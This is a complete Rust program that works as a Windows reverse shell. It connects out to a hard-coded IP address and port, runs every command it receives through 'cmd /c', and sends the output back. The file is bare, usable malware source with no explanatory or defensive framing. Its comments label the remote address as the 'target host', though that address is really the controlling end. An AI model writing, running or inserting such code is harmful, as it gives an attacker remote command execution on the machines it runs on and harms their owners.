use std::io::{self, Read, Write};
use std::net::{TcpStream};
use std::process::{Command, Stdio};

fn main() -> io::Result<()> {
    let ip = "10.1.20.67"; // target host IP address
    let port = "4464"; // target host port
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;

    println!("Connected to {}:{}", ip, port);

    loop {
        let mut buffer = [0; 1024];
        let bytes_read = stream.read(&mut buffer)?;
        let command = String::from_utf8_lossy(&buffer[..bytes_read]).trim().to_string();

        if command == "exit" {
            break;
        }

        let mut child = Command::new("cmd")
            .arg("/c")
            .arg(command)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .spawn()
            .expect("Failed to execute command");

        let mut output = String::new();
        child.stdout.as_mut().unwrap().read_to_string(&mut output)?;
        stream.write_all(output.as_bytes())?;
    }

    Ok(())
}
